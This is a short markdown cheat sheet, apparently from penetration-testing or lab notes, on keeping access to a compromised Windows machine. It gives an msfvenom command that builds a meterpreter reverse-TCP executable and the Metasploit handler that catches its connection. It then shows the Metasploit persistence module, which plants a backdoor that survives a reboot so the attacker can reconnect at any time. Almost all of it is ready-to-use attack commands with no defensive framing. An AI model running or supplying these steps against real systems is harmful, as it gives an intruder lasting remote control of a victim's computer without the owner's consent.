# Maintaining Access

### Generating a Payload w/ msfvenom

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe

use exploit/multi/handler

Background the meterpreter shell
```

### Run the Persistence Module 

```
use exploit/windows/local/persistence

set session 1
```

If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit ```multi handler``` and setting the payload to ```windows/meterpreter/reverse_tcp``` allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.